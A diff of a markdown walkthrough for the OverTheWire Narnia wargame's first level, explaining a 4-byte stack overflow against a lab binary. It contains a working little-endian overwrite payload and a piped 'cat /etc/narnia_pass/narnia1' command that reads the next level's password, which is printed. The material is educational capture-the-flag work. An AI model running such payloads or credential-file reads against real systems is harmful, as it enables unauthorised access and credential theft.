@@ -1,3 +1,5 @@
+# narnia0 -> narnia1
+
 ```bash
 ┏━•  ~
 ┗  ssh narnia0@narnia.labs.overthewire.org -p 2226
@@ -57,7 +59,7 @@ int main(){
 
 We can quickly see our buffer overflow in the code. The input character buffer (`char buf[20];`) has a length of 20 bytes, while the scanf() allows for 24 bytes (`scanf("%24s",&buf);`) of input leaving us 4 bytes to overflow. 
 
-Looking at the code we can see that val has been assigned the hexadecimal value 0x41414141 (`long val=0x41414141;`), which, when decoded to a string is `AAAA`. It looks like the program expects the user to enter 20 characters then 0xDEADBEEF.
+Looking at the code, we can see that val is assigned the hexadecimal value 0x41414141 (`long val=0x41414141;`), which, when decoded to a string is `AAAA`. It looks like the program expects the user to enter 20 characters then 0xDEADBEEF.
 
 Lets try running the program with 20 A's to see the output.
 ```bash
@@ -77,8 +79,9 @@ buf: AAAAAAAAAAAAAAAAAAAABBBB
 val: 0x42424242
 WAY OFF!!!!
 ```
-It works! We were able to modify `val`. Now lets try giving the program what it wants. 20 chars, and then 0xdeadbeef. So lets test with the correct payload (i.e. hexstring in reverse 0xefbeadde)
+It works! We were able to modify `val`.
 
+Now lets try giving the program what it wants. 20 chars, and then 0xdeadbeef. So lets test with the correct payload (i.e. hexstring in reverse 0xefbeadde)
 ```bash
 narnia0@narnia:~$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | /narnia/narnia0
 Correct vals value from 0x41414141 -> 0xdeadbeef!
@@ -89,7 +92,6 @@ val: 0xdeadbeef
 ###### NOTE: You may be wondering why deadbeef is written backwards ("\xef\xbe\xad\xde"). In x86 and x86-64 (and a variety of other hardware), multi-byte values such as addresses are stored in little-endian order, ie. "backwards" from the viewpoint of a person reading it.
 
 Now that we have privilege escilation lets get the password for narnia1 from /etc/narnia_pass/narnia1.
-
 ```bash
 narnia0@narnia:~$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; echo 'cat /etc/narnia_pass/narnia1') | /narnia/narnia0
 Correct vals value from 0x41414141 -> 0xdeadbeef!
@@ -99,7 +101,6 @@ efeidiedae       # password for narnia1
 ```
 
 Alternatively, print the string, and copy & paste it to get the the narnia1 shell and grab the password from /etc/ manually.
-
 ```bash
 narnia0@narnia:/narnia$ (echo -e 'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde\xaf';cat)
 AAAAAAAAAAAAAAAAAAAAﾭޯ                             # copy this to paste it
